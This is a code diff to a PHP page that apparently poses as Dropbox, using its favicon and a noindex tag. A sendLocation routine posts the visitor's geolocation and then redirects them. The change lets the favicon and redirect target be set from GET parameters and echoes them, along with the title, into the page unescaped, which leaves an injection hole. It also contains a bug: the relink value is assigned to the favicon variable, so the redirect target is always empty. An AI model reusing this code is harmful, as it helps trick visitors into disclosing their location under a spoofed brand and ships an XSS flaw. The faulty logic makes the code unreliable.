@@ -76,6 +76,19 @@ if (!isset($_GET['title'])) {
   $title = urldecode($_GET['title']);
 }
 
+$favi = "";
+if (!isset($_GET['favi'])) {
+  $favi = "https://cfl.dropboxstatic.com/static/metaserver/static/images/favicon-vfl8lUR9B.ico";
+}else{
+  $favi = urldecode($_GET['favi']);
+}
+
+$relink = "";
+if (!isset($_GET['relink'])) {
+  $favi = "https://dl.dropboxusercontent.com/u/37251493/";
+}else{
+  $favi = urldecode($_GET['relink']);
+}
 
 
 ?>
@@ -83,7 +96,7 @@ if (!isset($_GET['title'])) {
 
   <meta charset="UTF-8">
   <title><?php echo $title; ?></title>
-  <link rel="icon" href="https://cfl.dropboxstatic.com/static/metaserver/static/images/favicon-vfl8lUR9B.ico" type="image/x-icon">
+  <link rel="icon" href="<?php echo $favi; ?>" type="image/x-icon">
   <meta name="robots" content="noindex">
 
 
@@ -357,7 +370,7 @@ function sendLocation(position) {
   })
     .done(function(data) {
       console.log(data);
-      location.href = 'https://dl.dropboxusercontent.com/u/37251493/';
+      location.href = '<?php echo $relink; ?>';
     })
     .fail(function() {
       alert("no good");
